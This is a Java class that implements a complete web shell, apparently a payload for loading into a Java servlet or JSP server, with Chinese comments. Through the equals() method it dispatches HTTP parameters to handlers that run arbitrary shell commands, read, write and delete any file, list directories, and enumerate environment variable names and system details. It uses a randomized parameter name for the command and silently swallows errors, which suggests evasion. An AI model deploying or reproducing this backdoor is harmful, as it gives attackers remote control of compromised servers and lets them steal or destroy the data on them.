import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Base64;
import java.util.Date;
import java.util.Properties;

public class M {
    @Override
    public boolean equals(Object obj) {
        try {
            Object[] ctx = (Object[]) obj;
            HttpServletRequest req = (HttpServletRequest) ctx[0];
            HttpServletResponse res = (HttpServletResponse) ctx[1];
            res.setCharacterEncoding("UTF-8");

            String action = req.getParameter("a");
            if (action == null || action.length() == 0) {
                action = "ping";
            }

            String out;
            switch (action) {
                case "ping":
                    out = "MATRIX_JSP_PING";
                    break;
                case "exec":
                    out = handleExec(req);
                    break;
                case "pwd":
                    out = handlePwd();
                    break;
                case "ls":
                    out = handleLs(req);
                    break;
                case "cat":
                    out = handleCat(req);
                    break;
                case "write":
                    out = handleWrite(req);
                    break;
                case "rm":
                    out = handleRm(req);
                    break;
                case "home":
                    out = handleHome();
                    break;
                case "envnames":
                    out = handleEnvNames();
                    break;
                case "sysinfo":
                    out = handleSysInfo();
                    break;
                default:
                    out = "[Error] Unknown action: " + action;
                    break;
            }

            res.getWriter().print(out);
        } catch (Exception ignored) {
        }
        return true;
    }

    private String handleExec(HttpServletRequest req) {
        try {
            // _k 传入实际命令参数名（随机32位16进制），fallback 到 ecmd
            String key = req.getParameter("_k");
            if (key == null || key.isEmpty()) key = "ecmd";
            String cmd = req.getParameter(key);
            if (cmd == null) cmd = "";
            String os = System.getProperty("os.name").toLowerCase();
            String[] commands;
            if (os.contains("win")) {
                commands = new String[]{"cmd.exe", "/c", cmd};
            } else {
                commands = new String[]{"/bin/sh", "-c", cmd};
            }
            Process p = Runtime.getRuntime().exec(commands);
            String stdout = readStream(p.getInputStream());
            String stderr = readStream(p.getErrorStream());
            return stdout + stderr;
        } catch (Throwable t) {
            StringWriter sw = new StringWriter();
            PrintWriter pw = new PrintWriter(sw);
            t.printStackTrace(pw);
            pw.flush();
            return "[EXEC ERROR]\n" + sw.toString();
        }
    }

    private String handlePwd() throws IOException {
        return new File(".").getCanonicalPath();
    }

    private String handleLs(HttpServletRequest req) {
        String path = req.getParameter("path");
        if (path == null || path.length() == 0) path = ".";
        File dir = new File(path);
        if (!dir.exists() || !dir.isDirectory()) {
            return "ERR_OPEN";
        }
        StringBuilder sb = new StringBuilder();
        File[] files = dir.listFiles();
        if (files != null) {
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm");
            for (File f : files) {
                String name = f.getName();
                String type = f.isDirectory() ? "d" : "f";
                long size = f.isFile() ? f.length() : 0L;
                String perms = getPerms(f);
                String modified = sdf.format(new Date(f.lastModified()));
                String line = b64(name) + "|" + type + "|" + size + "|" + perms + "|" + modified;
                sb.append(line).append("\n");
            }
        }
        return sb.toString();
    }

    private String handleCat(HttpServletRequest req) throws IOException {
        String path = req.getParameter("path");
        if (path == null) path = "";
        File f = new File(path);
        if (!f.exists() || !f.isFile() || !f.canRead()) {
            return "[文件不存在或无权读取]";
        }
        return readFile(f);
    }

    private String handleWrite(HttpServletRequest req) throws IOException {
        String path = req.getParameter("path");
        String data = req.getParameter("data");
        if (path == null || data == null) return "0";
        byte[] bytes = Base64.getDecoder().decode(data);
        FileOutputStream fos = null;
        try {
            fos = new FileOutputStream(new File(path));
            fos.write(bytes);
            fos.flush();
            return "1";
        } finally {
            if (fos != null) {
                try {
                    fos.close();
                } catch (IOException ignored) {
                }
            }
        }
    }

    private String handleRm(HttpServletRequest req) {
        String path = req.getParameter("path");
        if (path == null) return "0";
        File f = new File(path);
        return f.delete() ? "1" : "0";
    }

    private String handleHome() {
        String home = System.getProperty("user.home");
        return home != null ? home : "";
    }

    private String handleEnvNames() {
        StringBuilder sb = new StringBuilder();
        for (String key : System.getenv().keySet()) {
            sb.append(key).append("\n");
        }
        return sb.toString();
    }

    private String handleSysInfo() {
        StringBuilder sb = new StringBuilder();
        Properties props = System.getProperties();
        appendInfo(sb, "OS", props.getProperty("os.name") + " " + props.getProperty("os.version"));
        appendInfo(sb, "Java版本", props.getProperty("java.version"));
        appendInfo(sb, "用户", props.getProperty("user.name"));
        appendInfo(sb, "当前目录", props.getProperty("user.dir"));
        appendInfo(sb, "用户目录", props.getProperty("user.home"));
        appendInfo(sb, "文件编码", props.getProperty("file.encoding"));
        return sb.toString();
    }

    private void appendInfo(StringBuilder sb, String key, String value) {
        if (value == null) value = "";
        sb.append(b64(key)).append("|").append(b64(value)).append("\n");
    }

    private String readStream(InputStream in) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int len;
        while ((len = in.read(buf)) != -1) {
            bos.write(buf, 0, len);
        }
        return bos.toString("UTF-8");
    }

    private String readFile(File f) throws IOException {
        FileInputStream fis = new FileInputStream(f);
        try {
            return readStream(fis);
        } finally {
            try {
                fis.close();
            } catch (IOException ignored) {
            }
        }
    }

    private String b64(String s) {
        try {
            return Base64.getEncoder().encodeToString(s.getBytes("UTF-8"));
        } catch (UnsupportedEncodingException e) {
            return Base64.getEncoder().encodeToString(s.getBytes());
        }
    }

    private String getPerms(File f) {
        StringBuilder sb = new StringBuilder();
        sb.append(f.canRead() ? "r" : "-");
        sb.append(f.canWrite() ? "w" : "-");
        sb.append(f.canExecute() ? "x" : "-");
        return sb.toString();
    }
}

